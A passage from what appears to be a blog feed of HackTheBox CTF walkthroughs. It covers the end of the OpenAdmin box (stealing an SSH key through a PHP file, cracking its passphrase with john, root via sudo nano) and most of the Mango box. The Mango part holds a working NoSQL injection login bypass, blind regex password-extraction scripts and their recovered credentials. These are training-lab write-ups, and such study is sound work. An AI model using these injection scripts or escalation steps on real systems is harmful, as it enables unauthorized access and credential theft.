class="variable">$output</span>;</span><br></pre></td></tr></table></figure><p>Now let’s run it! (Remember apache listen on port <code>52846</code> for this virutalhost as we can see in the <code>internal.conf</code> config file)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">jimmy@openadmin:/$ curl 127.0.0.1:52846/hg8.php</span><br><span class="line">-----BEGIN RSA PRIVATE KEY-----</span><br><span class="line">Proc-Type: 4,ENCRYPTED</span><br><span class="line">DEK-Info: AES-128-CBC,2AF25344B8391A25A9B318F3FD767D6D</span><br><span class="line"></span><br><span class="line">kG0UYIcGyaxupjQqaS2e1HqbhwRLlNctW2HfJeaKUjWZH4usiD9AtTnIKVUOpZN8</span><br><span class="line">ad/StMWJ+MkQ5MnAMJglQeUbRxcBP6++Hh251jMcg8ygYcx1UMD03ZjaRuwcf0YO</span><br><span class="line">[...]</span><br><span class="line">z0glMMmjR2L5c2HdlTUt5MgiY8+qkHlsL6M91c4diJoEXVh+8YpblAoogOHHBlQe</span><br><span class="line">K1I1cqiDbVE/bmiERK+G4rqa0t7VQN6t2VWetWrGb+Ahw/iMKhpITWLWApA3k9EN</span><br><span class="line">-----END RSA PRIVATE KEY-----</span><br></pre></td></tr></table></figure><p>Bingo! </p><p><em>Note: Don’t forget to remove your php file to not spoil users after you ;)</em></p><p>We can now use <code>joanna</code> ssh private key to login to her account:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ ssh -i joanna_id_rsa joanna@openadmin.htb</span><br><span class="line">Enter passphrase <span class="keyword">for</span> key <span class="string">&#x27;joanna_id_rsa&#x27;</span>:</span><br></pre></td></tr></table></figure><p>No luck! Passphrase is needed. From here we have two choices:</p><ol><li><p>Either we go back to our php script and edit it to open a reverse shell instead of grabbing the private key.</p></li><li><p>We try to brute-force <code>joanna</code> private key passphrase. </p></li></ol><p>I think it would be more interesting to show how to brute-force the hash, if we fail we can still go back to open a simple reserve shell. </p><p>I will use <code>john</code> to bruteforce the ssh key passphrase:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ ssh2john joanna_id_rsa &gt; id_rsa.hash</span><br><span class="line">[hg8@archbook ~]$ john --wordlist=~/SecLists/Passwords/Leaked-Databases/rockyou.txt id_rsa.hash</span><br><span class="line">Loaded 1 password <span class="built_in">hash</span> (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])</span><br><span class="line">bloodninjas      (joanna_id_rsa)</span><br><span class="line">1g 0:00:00:14 DONE (2020-01-24 17:05) 0.07062g/s 1012Kp/s 1012Kc/s 1012KC/s *7¡Vamos!</span><br><span class="line">Session completed</span><br><span class="line">[hg8@archbook ~]$ john --show id_rsa.hash</span><br><span class="line">joanna_id_rsa:bloodninjas</span><br></pre></td></tr></table></figure><p>Great we got it, and it’s related to ninja again. Let’s grab our flag now:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ ssh -i joanna_id_rsa joanna@openadmin.htb</span><br><span class="line">Enter passphrase <span class="keyword">for</span> key <span class="string">&#x27;joanna_id_rsa&#x27;</span>:</span><br><span class="line"></span><br><span class="line">Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-70-generic x86_64)</span><br><span class="line"></span><br><span class="line">Last login: Thu Jan  2 21:12:40 2020 from 10.10.14.3</span><br><span class="line">joanna@openadmin:~$ cat user.txt</span><br><span class="line">cxxxxxxxxxxxxxxxxxxxxxxxxxxf</span><br></pre></td></tr></table></figure><h2 id="Root-Flag"><a href="#Root-Flag" class="headerlink" title="Root Flag"></a>Root Flag</h2><h3 id="Recon-1"><a href="#Recon-1" class="headerlink" title="Recon"></a>Recon</h3><p>The recon phase won’t be needed there since we already got the information we needed while searching around for user flag. As a reminder:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">joanna@openadmin:~$ sudo -l</span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> joanna on openadmin:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/<span class="built_in">local</span>/sbin\:/usr/<span class="built_in">local</span>/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span><br><span class="line"></span><br><span class="line">User joanna may run the following commands on openadmin:</span><br><span class="line">    (ALL) NOPASSWD: /bin/nano /opt/priv</span><br></pre></td></tr></table></figure><p>A good habit for fast privilege escalation techniques is to check on <a href="https://gtfobins.github.io/">GTFOBins</a>.    </p><p>As a reminder:</p><blockquote><p>GTFOBins is a curated list of Unix binaries that can be exploited by an attacker to bypass local security restrictions.</p><p>The project collects legitimate functions of Unix binaries that can be abused to break out restricted shells, escalate or maintain elevated privileges, transfer files, spawn bind and reverse shells, and facilitate the other post-exploitation tasks.</p></blockquote><p>And of course there is an entry for <code>nano</code>:</p><p><img src="https://user-images.githubusercontent.com/9076747/73084568-7b88c480-3ecd-11ea-8092-c4d2e7eb43ed.png" alt="GTFObins nano"></p><p><em>Note: ^R means CTRL+R, same for ^X means CTRL+X</em></p><h3 id="Exploit-nano-SUID"><a href="#Exploit-nano-SUID" class="headerlink" title="Exploit nano SUID"></a>Exploit nano SUID</h3><p>Let’s give it a try!</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">joanna@openadmin:~$ sudo /bin/nano /opt/priv</span><br><span class="line">^R^X</span><br><span class="line">reset; sh 1&gt;&amp;0 2&gt;&amp;0</span><br><span class="line"><span class="comment"># id</span></span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)         </span><br><span class="line"><span class="comment"># cat /root/root.txt                           </span></span><br><span class="line">2xxxxxxxxxxxxxxxxxxxxxxxx1</span><br></pre></td></tr></table></figure><hr><p>As always do not hesitate to contact me for any questions or feedbacks :)</p><p>See you next time !</p><p>-hg8</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> HackTheBox </category>
          
          <category> Easy Box </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
            <tag> sudo </tag>
            
            <tag> gtfobins </tag>
            
            <tag> php </tag>
            
            <tag> john </tag>
            
            <tag> openadmin </tag>
            
            <tag> opennetadmin </tag>
            
            <tag> exploit </tag>
            
            <tag> shell_exec </tag>
            
            <tag> apache </tag>
            
            <tag> ssh </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HackTheBox - Mango</title>
      <link href="/posts/mango/"/>
      <url>/posts/mango/</url>
      
        <content type="html"><![CDATA[<img width="572" alt="mango-hackthebox" src="https://user-images.githubusercontent.com/9076747/82158122-27dc2580-9886-11ea-89a6-cf00163a1207.png"><p>Mango just retired on HackTheBox, it was an Medium difficulty Linux box. As usual I really liked the whole exploration process especially the custom exploitation part and learned a bit about Mongodb. I know I say this every-time but this box is my favorite box so far.</p><p><strong>Tl;Dr:</strong> User flag was accessible after exploiting an NoSQL injection flaw to extract usernames and passwords of accounts present on the box. Those credentials can be used to SSH login to the box as <code>mango</code> then pivoting to the <code>admin</code> user holding the flag by <code>su</code> to it using the password extracted previously.<br>The root flag was accessible by exploiting the <code>jjs</code> binary that have setuid bit set allowing to read and write files on the box as <code>root</code> user.</p><p>Alright! Let’s get into the details now!</p><hr><p>First thing first, let’s add the box IP to the host file:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ <span class="built_in">echo</span> <span class="string">&quot;10.10.10.162 mango.htb&quot;</span> &gt;&gt; /etc/hosts</span><br></pre></td></tr></table></figure><p>and let’s start!</p><h2 id="User-Flag"><a href="#User-Flag" class="headerlink" title="User Flag"></a>User Flag</h2><h3 id="Recon"><a href="#Recon" class="headerlink" title="Recon"></a>Recon</h3><p>Let’s start with the classic <code>nmap</code> scan to see which ports are open on the box:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ nmap -sV -sT -sC mango.htb</span><br><span class="line">Nmap scan report <span class="keyword">for</span> mango.htb (10.10.10.162)</span><br><span class="line">PORT    STATE SERVICE VERSION</span><br><span class="line">22/tcp  open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80/tcp  open  http    Apache httpd 2.4.29 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache/2.4.29 (Ubuntu)</span><br><span class="line">|_http-title: 403 Forbidden</span><br><span class="line">443/tcp open  ssl/ssl Apache httpd (SSL-only mode)</span><br><span class="line">|_http-title: Mango | Search Base</span><br><span class="line">|_ssl-cert: Subject: commonName=staging-order.mango.htb/organizationName=Mango Prv Ltd./stateOrProvinceName=None/countryName=IN</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 33.34 seconds</span><br></pre></td></tr></table></figure><p>We have a classical web apps running on port 80 and 443 and the SSH port 22 open. </p><p><code>nmap</code> scan display an interesting information about the SSL certificate on port 443:<br><code>staging-order.mango.htb</code>. Let’s add this <code>staging-order</code> to our <code>hosts</code> file since it can come useful in the future.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ <span class="built_in">echo</span> <span class="string">&quot;10.10.10.162 staging-order.mango.htb&quot;</span> &gt;&gt; /etc/hosts</span><br></pre></td></tr></table></figure><p>Opening <code>http://mango.htb</code> display a forbidden page while <code>https://mango.htb</code> display a search engine:</p><p><img src="https://user-images.githubusercontent.com/9076747/68053118-74498480-fceb-11e9-90d0-6509fb84711d.png" alt="mango search engine"></p><p><em>Note: Because Chrome wouldn’t display this page because of wrong certificate I completely skipped it before noticing it was accessible with Firefox. Because of that I accidentally avoided a big rabbit-hole. Win-Win.</em></p><p>Let’s fire <code>gobuster</code> to check if we can find interesting directories and/or pages there:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ gobuster dir -u http://mango.htb/ -w ~/SecLists/Discovery/Web-Content/big.txt -x php</span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.0.1</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)</span><br><span class="line">===============================================================</span><br><span class="line">/.htaccess (Status: 403)</span><br><span class="line">/.htpasswd (Status: 403)</span><br><span class="line">/server-status (Status: 403)</span><br></pre></td></tr></table></figure><p>Nothing here it seems… Let’s try port 443. We use option <code>-k</code> to skip SSL certificate verification:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ gobuster dir -u https://mango.htb/ -w ~/SecLists/Discovery/Web-Content/big.txt -x php -k</span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.0.1</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)</span><br><span class="line">===============================================================</span><br><span class="line">/.htaccess (Status: 403)</span><br><span class="line">/.htpasswd (Status: 403)</span><br><span class="line">/analytics.php (Status: 200)</span><br><span class="line">/index.php (Status: 200)</span><br><span class="line">/server-status (Status: 403)</span><br></pre></td></tr></table></figure><p>Not a lot of results but <code>analytics.php</code> sounds interesting. After a bit of research it turned out to be a rabbit hole I will skip it.</p><p>So what remain now ? Only <code>http://staging-order.mango.htb</code>. </p><p>Opening it display a classic login page :</p><p><img src="https://user-images.githubusercontent.com/9076747/68054811-7b729180-fcef-11e9-9355-f813b1351cea.png" alt="mango staging order">  </p><p><code>gobuster</code> doesn’t find any other interesting directories or pages so let’s focus on this login page.  </p><p>What do we first try when seeing a login page ? Injection of course!</p><p>After a few blind tries of common injection we don’t get any results. It’s kind of difficult to find the right payload because we don’t have any informations on the backend… </p><p>At this point I felt a bit out of ideas at this point to be honest. Taking a break helped me clear up my mind and think more carefully about the situation.  </p><p>Since we are on <code>hackthebox</code> we know that box name often give tips on what’s going on. So Mango…mango…mongo…mongodb? </p><p>Mongodb might be a nice start to try new techniques on this box. As a reminder:</p><blockquote><p>MongoDB is a cross-platform document-oriented database program. Classified as a NoSQL database program, MongoDB uses JSON-like documents with schema.<br><a href="https://www.mongodb.com/">https://www.mongodb.com/</a></p></blockquote><p>Mongodb is a NoSQL database software, and, as for SQL, NoSQL can be exploited by injection if input is not properly sanitized.<br>A lot of example are available when searching on google. This <a href="https://blog.websecurify.com/2014/08/hacking-nodejs-and-mongodb.html">blog post</a> gives the following example to bypass a login form:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">http://target/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line">username[$ne]=test&amp;password[$ne]=test</span><br></pre></td></tr></table></figure><h3 id="NoSQL-Injection"><a href="#NoSQL-Injection" class="headerlink" title="NoSQL Injection"></a>NoSQL Injection</h3><p>Let’s give it a try ! </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">curl <span class="string">&#x27;http://staging-order.mango.htb/&#x27;</span> --data <span class="string">&quot;username[<span class="variable">$ne</span>]=test&amp;password[<span class="variable">$ne</span>]=test&amp;login=login&quot;</span> -v</span><br><span class="line">&gt; POST / HTTP/1.1</span><br><span class="line">&gt; Host: staging-order.mango.htb</span><br><span class="line">&gt; Content-Length: 49</span><br><span class="line">&gt; Content-Type: application/x-www-form-urlencoded</span><br><span class="line">&lt; HTTP/1.1 302 Found</span><br><span class="line">&lt; Date: Sat, 02 Nov 2019 20:56:09 GMT</span><br><span class="line">&lt; Server: Apache/2.4.29 (Ubuntu)</span><br><span class="line">&lt; location: home.php</span><br><span class="line">[...]</span><br></pre></td></tr></table></figure><p>This time we got a <code>302 Found</code>! Seems like the injection succeed and bypassed the login form. Let’s relaunch the request with <code>-L</code> flag to prevent <code>curl</code> from redirecting back to the login page:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ curl <span class="string">&#x27;http://staging-order.mango.htb/&#x27;</span> --data <span class="string">&quot;username[<span class="variable">$ne</span>]=test&amp;password[<span class="variable">$ne</span>]=test&amp;login=login&quot;</span> -L</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;en&quot;</span>&gt;</span><br><span class="line">[...]</span><br><span class="line">&lt;h1&gt;Under Plantation&lt;/h1&gt;</span><br><span class="line">&lt;h2&gt;Sorry <span class="keyword">for</span> the inconvenience. We just started farming!&lt;/h2&gt;</span><br><span class="line">&lt;h3&gt;To contact us <span class="keyword">in</span> the meantime please email: admin@mango.htb&lt;br /&gt;</span><br><span class="line">We rarely look at our inboxes.&lt;/h3&gt;</span><br><span class="line">&lt;/main&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>Nothing there either… That’s disappointing. But we are definitely on the right track.  </p><h3 id="Blind-NoSQL-data-extract"><a href="#Blind-NoSQL-data-extract" class="headerlink" title="Blind NoSQL data extract"></a>Blind NoSQL data extract</h3><p>Let’s summarize what we knows:</p><ul><li>We can do NoSQL injection.</li><li>Successful injection will return <code>302 Found</code>.</li></ul><p>Those two informations are enough to allow us to blindly extract data from the Mongodb instance. Here is an example :</p><p>Using <a href="https://docs.mongodb.com/manual/reference/operator/query/regex/"><code>$regex</code></a> we will be able to submit a regex by injection. If the regex have a match the server will return <code>302 Found</code>. This will allows us to extract data.</p><p>For example if sending the following payload<br><code>username[$regex]=^a&amp;password[$ne]=test</code> return:</p><ul><li><code>302 Found</code> means that the regex matched, so username start with a <code>a</code>. </li><li><code>200 OK</code> the regex did not match.</li></ul><p>Following this logic we can try with the next letter with regex <code>^ad</code>, <code>^adm</code>, <code>^admi</code> and <code>^admin</code> and so on until we get full username. You get the idea ? :) </p><p>And once we have the full username we can do the exact same to extract the password.</p><p>Having all of those informations in mind, we can craft a script to do the job for us :</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://staging-order.mango.htb&quot;</span></span><br><span class="line"></span><br><span class="line">username = <span class="string">&quot;&quot;</span></span><br><span class="line">password = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> string.ascii_letters+string.digits:</span><br><span class="line"></span><br><span class="line">        payload = &#123;</span><br><span class="line">            <span class="string">&quot;username[$regex]&quot;</span>: <span class="string">&quot;^&quot;</span>+username+c,</span><br><span class="line">            <span class="string">&quot;password[$ne]&quot;</span>: password</span><br><span class="line">        &#125;</span><br><span class="line">    </span><br><span class="line">        r = requests.post(url, data=payload, allow_redirects=<span class="literal">False</span>)</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">if</span> r.status_code == <span class="number">302</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[+] Found one more char : <span class="subst">&#123;username+c&#125;</span>&quot;</span>)</span><br><span class="line">            username += c</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>Let’s try that!</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ python extract_user.py</span><br><span class="line">[+] Found one more char : a</span><br><span class="line">[+] Found one more char : ad</span><br><span class="line">[+] Found one more char : adm</span><br><span class="line">[+] Found one more char : admi</span><br><span class="line">[+] Found one more char : admin</span><br></pre></td></tr></table></figure><p>So the user account is …. <code>admin</code>. I think we could have guessed it after all.</p><p>Let’s now tweak our script to do the same for extracting passwords: </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://staging-order.mango.htb&quot;</span></span><br><span class="line"></span><br><span class="line">username = sys.argv[<span class="number">1</span>]</span><br><span class="line">password = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> string.printable:</span><br><span class="line"></span><br><span class="line">        <span class="comment"># We skip characters that will be interpreted as regex</span></span><br><span class="line">        <span class="keyword">if</span> c <span class="keyword">not</span> <span class="keyword">in</span> [<span class="string">&#x27;*&#x27;</span>, <span class="string">&#x27;+&#x27;</span>, <span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;|&#x27;</span>, <span class="string">&#x27;$&#x27;</span>]:</span><br><span class="line">    </span><br><span class="line">            payload = &#123;</span><br><span class="line">                <span class="string">&quot;username&quot;</span>: username,</span><br><span class="line">                <span class="string">&quot;password[$regex]&quot;</span>: <span class="string">&quot;^&quot;</span>+password+c</span><br><span class="line">            &#125;</span><br><span class="line">    </span><br><span class="line">            r = requests.post(url, data=payload, allow_redirects=<span class="literal">False</span>)</span><br><span class="line">    </span><br><span class="line">            <span class="keyword">if</span> r.status_code == <span class="number">302</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;[+] Found one more char : <span class="subst">&#123;password+c&#125;</span>&quot;</span>)</span><br><span class="line">                password += c</span><br></pre></td></tr></table></figure><p>Let’s launch it:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ python extract_password.py admin</span><br><span class="line">[+] Found one more char : t</span><br><span class="line">[+] Found one more char : t9</span><br><span class="line">[+] Found one more char : t9K</span><br><span class="line">[+] Found one more char : t9Kc</span><br><span class="line">[+] Found one more char : t9KcS</span><br><span class="line">[+] Found one more char : t9KcS3</span><br><span class="line">[+] Found one more char : t9KcS3&gt;</span><br><span class="line">[+] Found one more char : t9KcS3&gt;!</span><br><span class="line">[+] Found one more char : t9KcS3&gt;!0</span><br><span class="line">[+] Found one more char : t9KcS3&gt;!0B</span><br><span class="line">[+] Found one more char : t9KcS3&gt;!0B<span class="comment">#</span></span><br><span class="line">[+] Found one more char : t9KcS3&gt;!0B<span class="comment">#2</span></span><br></pre></td></tr></table></figure><p>While we could have bruteforced the <code>admin</code> username using a wordlist it definitely wouldn’t have been possible for the password. </p><p>We now have a username and a password (<code>admin</code>:<code>t9KcS3&gt;!0B#2</code>). What the first thing we do when we have those kind of informations ? Login to SSH of course:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ ssh admin@mango.htb</span><br><span class="line">admin@mango.htb<span class="string">&#x27;s password:</span></span><br><span class="line"><span class="string">Permission denied, please try again.</span></span><br></pre></td></tr></table></figure><p>Nop doesn’t work.</p><p>Then maybe another user account can be extracted from Mongodb instance, let’s tweak our regex to return an user that is not <code>admin</code>:</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="deletion">- &quot;username[$regex]&quot;: &quot;^&quot;+username+c,</span></span><br><span class="line"><span class="addition">+ &quot;username[$regex]&quot;: &quot;^(?!admin)&quot;+username+c,</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ python extract_user.py</span><br><span class="line">[+] Found one more char : m</span><br><span class="line">[+] Found one more char : ma</span><br><span class="line">[+] Found one more char : man</span><br><span class="line">[+] Found one more char : mang</span><br><span class="line">[+] Found one more char : mango</span><br></pre></td></tr></table></figure><p>We could have guessed this one aswell. Let’s get its password: </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ python extract_password.py mango</span><br><span class="line">[+] Found one more char : h</span><br><span class="line">[+] Found one more char : h3</span><br><span class="line">[+] Found one more char : h3m</span><br><span class="line">[+] Found one more char : h3mX</span><br><span class="line">[+] Found one more char : h3mXK</span><br><span class="line">[+] Found one more char : h3mXK8</span><br><span class="line">[+] Found one more char : h3mXK8R</span><br><span class="line">[+] Found one more char : h3mXK8Rh</span><br><span class="line">[+] Found one more char : h3mXK8RhU</span><br><span class="line">[+] Found one more char : h3mXK8RhU~</span><br><span class="line">[+] Found one more char : h3mXK8RhU~f</span><br><span class="line">[+] Found one more char : h3mXK8RhU~f&#123;</span><br><span class="line">[+] Found one more char : h3mXK8RhU~f&#123;]</span><br><span class="line">[+] Found one more char : h3mXK8RhU~f&#123;]f</span><br><span class="line">[+] Found one more char : h3mXK8RhU~f&#123;]f5</span><br><span class="line">[+] Found one more char : h3mXK8RhU~f&#123;]f5H</span><br></pre></td></tr></table></figure><p>Alright we have <code>mango</code>:<code>h3mXK8RhU~f&#123;]f5H</code>, let’s try to SSH again:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ ssh mango@mango.htb</span><br><span class="line">mango@mango.htb<span class="string">&#x27;s password:</span></span><br><span class="line"><span class="string">Welcome to Ubuntu 18.04.2 LTS (GNU/Linux 4.15.0-64-generic x86_64)</span></span><br><span class="line"><span class="string">Last login: Mon Nov  4 09:50:35 2019 from 10.10.15.27</span></span><br><span class="line"><span class="string">mango@mango:~$ id</span></span><br><span class="line"><span class="string">uid=1000(mango) gid=1000(mango) groups=1000(mango)</span></span><br><span class="line"><span class="string">mango@mango:~$ ls -l</span></span><br><span class="line"><span class="string">mango@mango:~$</span></span><br></pre></td></tr></table></figure><p>That’s a good step ahead! Unfortunately no user flag here… </p><h3 id="Pivot-mango-gt-admin"><a href="#Pivot-mango-gt-admin" class="headerlink" title="Pivot mango -&gt; admin"></a>Pivot mango -&gt; admin</h3><p>Let’s do a bit of enumeration:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mango@mango:~$ ls -l /home</span><br><span class="line">drwxr-xr-x 2 admin admin 4096 Nov  4 10:07 admin</span><br><span class="line">drwxr-xr-x 5 mango mango 4096 Nov  4 09:31 mango</span><br><span class="line">mango@mango:~$ ls -l /home/admin</span><br><span class="line">-r-------- 1 admin admin   33 Sep 27 14:29 user.txt</span><br></pre></td></tr></table></figure><p>User <code>admin</code> holds the flag. Let’s try to access it using common method since we probably got its password (<code>t9KcS3&gt;!0B#2</code>):</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mango@mango:~$ sudo -u admin cat /home/admin/user.txt</span><br><span class="line">[sudo] password <span class="keyword">for</span> mango:</span><br><span class="line">mango is not <span class="keyword">in</span> the sudoers file.  This incident will be reported.</span><br></pre></td></tr></table></figure><p>Oops, obligatory xkcd</p><p><img 